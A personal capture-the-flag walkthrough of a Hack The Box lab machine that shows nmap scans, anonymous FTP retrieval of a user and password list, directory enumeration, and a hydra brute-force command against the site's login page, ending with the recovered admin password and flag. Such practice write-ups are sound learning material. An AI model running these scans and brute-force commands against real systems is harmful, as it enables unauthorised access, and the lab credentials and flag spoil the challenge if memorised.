Hackthebox

Scan
website available on the $ip
└─# nmap -sV -Pn -p- --min-rate 5000 $ip             
Not shown: 37036 filtered tcp ports (no-response), 28497 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
21/tcp open  tcpwrapped
80/tcp open  tcpwrapped
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Hackthebox]
└─# nmap -sV -Pn -p80 $ip                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-19 17:03 EDT
Nmap scan report for 10.129.239.91
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds


second nmap 
┌──(root㉿kali)-[/home/…/Desktop/Code/CTFs/HackNote]
└─# nmap -sV -Pn -p21 $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-19 16:42 EDT
Nmap scan report for 10.129.239.91
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

3rd nmap scan
┌──(root㉿kali)-[/home/…/Desktop/Code/CTFs/HackNote]
└─# nmap -sC -Pn -p21 $ip                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-19 16:43 EDT
Nmap scan report for 10.129.239.91
Host is up (0.62s latency).
```
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.232
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

```
ftp> ls
229 Entering Extended Passive Mode (|||40752|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> 

```
got user and password

Now go on the website and perform directory scan

```

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
                        [Status: 200, Size: 58565, Words: 26449, Lines: 1000]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
dashboard               [Status: 301, Size: 318, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 58565, Words: 26449, Lines: 1000]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]

```

found an dashboard that redirect me : http://10.129.239.91/login.php
I think i will bruteforce it using these username and password
I will use hydra for that
```
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Hackthebox]
└─# hydra -L allowed.userlist -P allowed.userlist.passwd $ip http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect information."
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-19 16:57:26
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-post-form://10.129.239.91:80/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect information.
[80][http-post-form] host: 10.129.239.91   login: admin   password: rKXM59ESxesUFHAd
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-19 16:57:52

```
user admin, pass = rKXM59ESxesUFHAd
flag = c7110277ac44d78b6a9fff2232434d16